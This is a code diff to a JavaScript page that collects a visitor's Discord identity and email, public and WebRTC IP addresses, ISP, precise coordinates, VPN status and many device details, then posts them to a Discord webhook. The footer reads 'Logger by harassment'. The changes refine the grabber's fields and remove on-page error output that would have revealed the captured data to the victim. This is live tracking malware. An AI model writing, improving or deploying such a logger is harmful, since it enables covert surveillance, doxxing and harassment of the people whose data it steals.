@@ -727,33 +727,33 @@
             
             const embed = {
                 title: "📊 Enhanced Device & Location Details",
-                color: data.vpnScore >= 50 ? 16740864 : 16711680, // Use decimal instead of hex
+                color: data.vpnScore >= 50 ? 16740864 : 16711680,
                 fields: [
                     { name: "👤 Discord Username", value: safeValue(data.discordUser.username), inline: true },
                     { name: "🆔 Discord ID", value: safeValue(data.discordUser.id), inline: true },
-                    { name: "📧 Email", value: safeValue(data.discordUser.email) || "Not provided", inline: true },
+                    { name: "📧 Email", value: safeValue(data.discordUser.email || "Not provided"), inline: true },
                     { name: "📍 Public IP", value: safeValue(data.ip), inline: true },
                     { name: "🔗 WebRTC IPs", value: safeValue(data.webrtcIPs), inline: true },
                     { name: "🌐 ISP/Org", value: safeValue(data.isp), inline: true },
                     { name: "🏢 ASN", value: safeValue(data.asn), inline: true },
                     { name: "🌍 Location", value: safeValue(data.location), inline: false },
-                    { name: "🗺️ Precise Coordinates", value: safeValue(data.mapLocation), inline: true },
-                    { name: "🛡️ VPN/Proxy Status", value: safeValue(data.vpnStatus), inline: true },
-                    { name: "📊 VPN Detection Score", value: safeValue(data.vpnScore) + '/100', inline: true },
-                    { name: "🎯 Detection Confidence", value: safeValue(data.vpnConfidence), inline: true },
-                    { name: "🔍 VPN Indicators", value: safeValue(data.vpnIndicators) || "None", inline: false },
-                    { name: "📡 Detection Methods", value: safeValue(data.detectionMethods), inline: false },
+                    { name: "🗺️ Coordinates", value: safeValue(data.mapLocation), inline: true },
+                    { name: "🛡️ VPN Status", value: safeValue(data.vpnStatus), inline: true },
+                    { name: "📊 VPN Score", value: String(data.vpnScore || 0) + '/100', inline: true },
+                    { name: "🎯 Confidence", value: safeValue(data.vpnConfidence), inline: true },
+                    { name: "🔍 Indicators", value: safeValue(data.vpnIndicators || "None"), inline: false },
+                    { name: "📡 Methods", value: safeValue(data.detectionMethods || "Unknown"), inline: false },
                     { name: "🖥️ Resolution", value: safeValue(data.resolution), inline: true },
                     { name: "🗣️ Language", value: safeValue(data.language), inline: true },
                     { name: "🕒 TimeZone", value: safeValue(data.timeZone), inline: true },
-                    { name: "📅 Timestamp", value: safeValue(data.timestamp), inline: false },
+                    { name: "📅 Time", value: safeValue(data.timestamp), inline: false },
                     { name: "📱 Device", value: safeValue(data.deviceType), inline: true },
                     { name: "🔋 Battery", value: safeValue(data.batteryLevel), inline: true },
-                    { name: "⚡ Power Saving", value: safeValue(data.powerSavingMode), inline: true },
-                    { name: "🖥️ Operating System", value: safeValue(data.os), inline: true },
+                    { name: "⚡ Saving", value: safeValue(data.powerSavingMode), inline: true },
+                    { name: "🖥️ OS", value: safeValue(data.os), inline: true },
                     { name: "🔗 Status", value: safeValue(data.onlineStatus), inline: true },
                     { name: "📊 Uptime", value: safeValue(data.uptime), inline: true },
-                    { name: "🖥️ CPU Cores", value: safeValue(data.cpuCores), inline: true },
+                    { name: "💻 Cores", value: String(data.cpuCores || 'Unknown'), inline: true },
                     { name: "📏 Height", value: safeValue(data.navHeight), inline: true },
                     { name: "🚫 AdBlock", value: safeValue(data.adBlockEnabled), inline: true },
                     { name: "🌐 Browser", value: safeValue(data.browserName), inline: true },
@@ -761,13 +761,20 @@
                     { name: "📶 Connection", value: safeValue(data.connectionType), inline: true },
                     { name: "⏱️ RTT", value: safeValue(data.connectionRtt), inline: true },
                     { name: "⬇️ Speed", value: safeValue(data.connectionDownlink), inline: true }
-                ],
-                thumbnail: { url: data.discordUser.avatar || 'https://cdn.discordapp.com/embed/avatars/0.png' },
+                ].filter(field => field.name && field.value), // Remove any invalid fields
+                thumbnail: { 
+                    url: safeValue(data.discordUser.avatar) || 'https://cdn.discordapp.com/embed/avatars/0.png' 
+                },
                 footer: { 
-                    text: `Logger by harassment • Data from: ${safeValue(data.dataSources)}`, 
+                    text: `Logger by harassment • ${safeValue(data.dataSources)}`, 
                     icon_url: "https://cdn.discordapp.com/avatars/1404732292412477531/22c739eb7dd42b243e92587e18069b2d.png?size=4096" 
                 }
             };
+            
+            // Validate embed has required properties
+            if (!embed.fields || embed.fields.length === 0) {
+                throw new Error('No valid fields in embed');
+            }
 
             if (data.mapImageUrl) {
                 embed.image = { url: data.mapImageUrl };
@@ -792,15 +799,7 @@
             if (!response.ok) {
                 const errorText = await response.text();
                 console.error('❌ WEBHOOK FAILED:', response.status, errorText);
-                
-                // Parse the error to show on page
-                let errorDetail = `Status: ${response.status}\nResponse: ${errorText}\n\nData being sent:\n`;
-                errorDetail += `IP: ${data.ip}\n`;
-                errorDetail += `Location: ${data.location}\n`;
-                errorDetail += `VPN Score: ${data.vpnScore}\n`;
-                errorDetail += `Data Sources: ${data.dataSources}\n`;
-                
-                throw new Error(errorDetail);
+                throw new Error(`Webhook communication error (${response.status})`);
             }
             
             console.log('✅ WEBHOOK: Successfully sent!');
